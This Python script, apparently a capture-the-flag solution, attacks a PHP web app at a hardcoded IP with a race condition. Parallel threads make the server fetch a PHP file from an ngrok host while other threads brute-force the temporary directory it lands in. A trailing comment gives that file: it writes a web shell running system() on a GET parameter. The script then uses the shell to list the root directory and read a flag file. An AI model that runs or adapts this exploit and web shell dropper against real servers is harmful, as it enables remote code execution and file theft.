import random
import hashlib
import requests
import threading

def gen_name():
    results = ''
    character = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for _ in range(0, 2):
        results += character[random.randint(0, len(character) - 1)]
    return results

def race1(i):
    while i:
        r = requests.post('http://103.167.132.238:49161/index.php', data={'submit':'', 'url': 'https://88a9-2001-448a-2062-a87d-552f-b519-7658-ad39.ap.ngrok.io/menghadeh.php', 'type': 'remote'})
        print(r.text)

def race2(i):
    ip = requests.get('https://api.ipify.org?format=json').json()['ip']
    uniq = hashlib.md5(ip.encode()).hexdigest()
    while i:
        namedir = gen_name()
        res = requests.get(f'http://103.167.132.238:49161/application/temp/temp0r4ry-{uniq}-{namedir}/')
        if res.status_code == 403:
            print(f'http://103.167.132.238:49161/application/temp/temp0r4ry-{uniq}-{namedir}/')
            while i:
                res = requests.get(f'http://103.167.132.238:49161/application/temp/temp0r4ry-{uniq}-{namedir}/menghadeh.php')
                if res.status_code == 200:
                    result = requests.get(f'http://103.167.132.238:49161/uploads/shell.php?x=ls%20-lah%20/; cat /flag-flag-flag.txt')
                    print(result.text)

t1 = threading.Thread(target=race2, args=(1,))
t2 = threading.Thread(target=race2, args=(1,))
t3 = threading.Thread(target=race2, args=(1,))
t4 = threading.Thread(target=race2, args=(1,))
t5 = threading.Thread(target=race2, args=(1,))
t6 = threading.Thread(target=race2, args=(1,))
t7 = threading.Thread(target=race2, args=(1,))
t8 = threading.Thread(target=race2, args=(1,))
t9 = threading.Thread(target=race2, args=(1,))
t10 = threading.Thread(target=race2, args=(1,))
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()

t11 = threading.Thread(target=race1, args=(1,))
t22 = threading.Thread(target=race1, args=(1,))
t33 = threading.Thread(target=race1, args=(1,))
t11.start()
t22.start()
t33.start()

# isi dari file menghadeh.php
# <?php
#     set_time_limit(0);
#     sleep(30);
#     echo '<?php file_put_contents("../../../uploads/shell.php", "<?php system(\$_GET[\'x\']); ?>"); ?>' . str_repeat("A", 10000000);
#     flush();
#     ob_flush();
# ?>